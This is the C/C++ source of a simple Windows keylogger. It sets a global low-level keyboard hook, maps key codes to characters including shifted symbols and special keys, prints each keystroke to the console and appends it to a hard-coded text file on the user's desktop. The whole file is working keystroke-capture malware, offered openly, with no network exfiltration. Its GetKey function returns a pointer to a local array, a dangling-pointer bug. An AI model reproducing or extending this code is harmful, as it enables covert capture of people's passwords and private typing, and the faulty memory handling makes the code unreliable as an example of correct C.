#include <stdio.h>
#include <Windows.h>
#include <string>

HHOOK gHookHandle;
bool isCap;
int key;
int SValLen;
HANDLE hFile;
bool fileExistYet = false;


bool comitFile(char data[], DWORD dwBytesToWrite);
LRESULT CALLBACK keyLoggerHook(int nCode, WPARAM wParam, LPARAM lParam);
char* GetKey(int key, bool shift);

LRESULT CALLBACK keyLoggerHook(int nCode, WPARAM wParam, LPARAM lParam) {
    
    if (wParam == WM_KEYDOWN)
    {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        //---------------------------------- is capital or not (boolien value stored in "isCap")
        if (p->vkCode == VK_LSHIFT || p->vkCode == VK_RSHIFT)
        {
            isCap = true;
        }
        if (p->vkCode == VK_CAPITAL)
        {
            if (isCap)
            {
                isCap = false;
            }
            else
            {
                isCap = true;
            }
        }
        //-----------------------------------
        key = p->vkCode;
        char *temp = GetKey(key, isCap);
        char data[20];
        char* temp2 = data;
        while (*temp)
        {
            *temp2++ = *temp++;
        }
        *temp2 = '\0';
        comitFile(data, SValLen);
        return CallNextHookEx(gHookHandle, nCode, wParam, lParam);// must go to the next hook or bad things will happned
    }
    if (wParam == WM_KEYUP)
    {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;// get the struct containing the pressed key value
        if (p->vkCode == VK_LSHIFT || p->vkCode == VK_RSHIFT)
        {
            isCap = false;
        }
    }

    return CallNextHookEx(gHookHandle, nCode, wParam, lParam);// must go to the next hook or bad things will happned
}

bool comitFile(char data[], DWORD dwBytesToWrite)
{
    bool sucsses;
    if (!fileExistYet)
    {
        fileExistYet = true;
        //create a file
        hFile = CreateFile(L"C:\\Users\\Owner\\Desktop\\keyloggerTextFile.txt",// name of the write - path for the file to open in
            FILE_APPEND_DATA,          // open for writing
            0,                      // do not share
            NULL,                   // default security
            OPEN_ALWAYS,            // open file only
            FILE_ATTRIBUTE_NORMAL,  // normal file
            NULL);                  // no attr. template
        if (hFile == INVALID_HANDLE_VALUE)
        {
            printf("\nerror comiting file");
            
        }
    }
    DWORD numOfWritenBytes;

    //write in to a file
    sucsses = WriteFile(hFile, (LPCVOID)data, dwBytesToWrite, &numOfWritenBytes, NULL);// work here to be done
    return sucsses;
}

char* GetKey(int key, bool shift)// need to return sVal
{
    bool isString = false;
    char SVal[20] = "";
    if (key >= 0x41 && key <= 0x5A)// if true, the key is a simple letter (a,b,c...)
    {
        if (shift)
        {
            SVal[0] = key;
        }
        else
        {
            SVal[0] = key + 32;
        }
        printf("%c", SVal[0]);
        SValLen = 1;
    }
    else if (key >= 0x30 && key <= 0x39 && !shift)
    {
        SVal[0] = key;
        printf("%c", SVal[0]);
        SValLen = 1;
    }
    else if (key >= 0x30 && key <= 0x39 && shift)
    {
        //switch case for "!@#$%^&*()"
        switch (key)
        {
        case 0x30:
            SVal[0] = ')'; printf("%c", SVal[0]);
            break;
        case 0x31:
            SVal[0] = '!'; printf("%c", SVal[0]);
            break;
        case 0x32:
            SVal[0] = '@'; printf("%c", SVal[0]);
            break;
        case 0x33:
            SVal[0] = '#'; printf("%c", SVal[0]);
            break;
        case 0x34:
            SVal[0] = '$'; printf("%c", SVal[0]);
            break;
        case 0x35:
            SVal[0] = '%'; printf("%c", SVal[0]);
            break;
        case 0x36:
            SVal[0] = '^'; printf("%c", SVal[0]);
            break;
        case 0x37:
            SVal[0] = '&'; printf("%c", SVal[0]);
            break;
        case 0x38:
            SVal[0] = '*'; printf("%c", SVal[0]);
            break;
        case 0x39:
            SVal[0] = '('; printf("%c", SVal[0]);
            break;
        default:
            break;
        }
        SValLen = 1;
    }
    else
    {
        // all the "unique" keys (and some i could not isolate in every other way...)
        isString = true;
        switch (key)
        {
        case VK_SPACE:
            SVal[0] = ' '; SValLen = 1;
            printf("%s", SVal);
            break;
        case VK_TAB:
            SVal[0] = '['; SVal[1] = 'T'; SVal[2] = 'A'; SVal[3] = 'B'; SVal[4] = ']'; SValLen = 5;
            printf("%s", SVal);
            break;
        case VK_BACK:
            SVal[0] = '['; SVal[1] = 'B'; SVal[2] = 'A'; SVal[3] = 'C'; SVal[4] = 'K'; SVal[5] = 'S';
            SVal[6] = 'P'; SVal[7] = 'A'; SVal[8] = 'C'; SVal[9] = 'E'; SVal[10] = ']'; SValLen = 11;
            printf("%s", SVal);
            break;
        case VK_ESCAPE:
            SVal[0] = '['; SVal[1] = 'E'; SVal[2] = 'S'; SVal[3] = 'C'; SVal[4] = ']'; SValLen = 5;
            printf("%s", SVal);
            break;
        case VK_LEFT:
            SVal[0] = '['; SVal[1] = '<'; SVal[2] = '-'; SVal[3] = ']'; SValLen = 4;
            printf("%s", SVal);
            break;
        case VK_RIGHT:
            SVal[0] = '['; SVal[1] = '-'; SVal[2] = '>'; SVal[3] = ']'; SValLen = 4;
            printf("%s", SVal);
            break;
        case VK_UP:
            SVal[0] = '['; SVal[1] = '^'; SVal[2] = ']'; SValLen = 3;
            printf("%s", SVal);
            break;
        case VK_DOWN:
            SVal[0] = '['; SVal[1] = 'v'; SVal[2] = ']'; SValLen = 3;
            printf("%s", SVal);
            break;
        case VK_DELETE:
            SVal[0] = '['; SVal[1] = 'D'; SVal[2] = 'E'; SVal[3] = 'L'; SVal[4] = ']'; SValLen = 5;
            printf("%s", SVal);
            break;
        case VK_HOME:
            SVal[0] = '['; SVal[1] = 'H'; SVal[2] = 'O'; SVal[3] = 'M'; SVal[4] = 'E'; SVal[5] = ']'; SValLen = 6;
            printf("%s", SVal);
            break;
        case VK_END:
            SVal[0] = '['; SVal[1] = 'E'; SVal[2] = 'N'; SVal[3] = 'D'; SVal[4] = ']'; SValLen = 5;
            printf("%s", SVal);
            break;
        case VK_RETURN:
            SVal[0] = '['; SVal[1] = 'E'; SVal[2] = 'N'; SVal[3] = 'T'; SVal[4] = 'E'; SVal[5] = 'R'; SVal[6] = ']'; SValLen = 7;
            printf("%s", SVal);
            break;
        case VK_OEM_COMMA:
            SVal[0] = ','; SValLen = 1;
            printf("%s", SVal);
            break;
        case VK_OEM_MINUS:
            SVal[0] = '-'; SValLen = 1;
            printf("%s", SVal);
            break;
        case VK_OEM_PERIOD:
            SVal[0] = '.'; SValLen = 1;
            printf("%s", SVal);
            break;
        case VK_OEM_PLUS:
            if (shift) SVal[0] = '+'; else SVal[0] = '='; SValLen = 1;
            printf("%s", SVal);
            break;
        case VK_OEM_1:
            if (shift) SVal[0] = ':'; else SVal[0] = ';'; SValLen = 1;
            printf("%s", SVal);
            break;
        case VK_OEM_2:
            if (shift) SVal[0] = '?'; else SVal[0] = '/'; SValLen = 1;
            printf("%s", SVal);
            break;
        case VK_OEM_3:
            if (shift) SVal[0] = '~'; else SVal[0] = '`'; SValLen = 1;
            printf("%s", SVal);
            break;
        case VK_OEM_4:
            if (shift) SVal[0] = '{'; else SVal[0] = '['; SValLen = 1;
            printf("%s", SVal);
            break;
        case VK_OEM_5:
            if (shift) SVal[0] = '|'; else SVal[0] = '\\'; SValLen = 1;
            printf("%s", SVal);
            break;
        case VK_OEM_6:
            if (shift) SVal[0] = '}'; else SVal[0] = ']'; SValLen = 1;
            printf("%s", SVal);
            break;
        case VK_OEM_7:
            if (shift) SVal[0] = '"'; else SVal[0] = '\''; SValLen = 1;
            printf("%s", SVal);
            break;
        //the "no need to diplay" keys
        case VK_LCONTROL:
            SValLen = 0;
            break;
        case VK_RCONTROL:
            SValLen = 0;
            break;
        case VK_LSHIFT:
            SValLen = 0;
            break;
        case VK_RSHIFT:
            SValLen = 0;
            break;
        case VK_CAPITAL:
            SValLen = 0;
            break;
        default:
            SVal[0] = '['; SVal[1] = 'U'; SVal[2] = 'N'; SVal[3] = 'K'; SVal[4] = 'N';
            SVal[5] = 'O';SVal[6] = 'W'; SVal[7] = 'N'; SVal[8] = ']'; SValLen = 9;
            printf("%s", SVal);
            break;
        }
    }
    return SVal;
}

int main(void) {
    gHookHandle = SetWindowsHookEx(WH_KEYBOARD_LL, keyLoggerHook, GetModuleHandle(NULL), 0);
    
    if (NULL == gHookHandle) {
        printf("ERROR CREATING HOOK: \n");
        printf("%d\n", GetLastError());
        getchar();
        return 0;
    }

    MSG message;

    while (GetMessage(&message, NULL, 0, 0) != 0)// catch the windows messsanges and sen them to the keyLoggerHook function
    {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }

    printf("Press any key to quit...");
    getchar();

    UnhookWindowsHookEx(gHookHandle);

    return 0;
}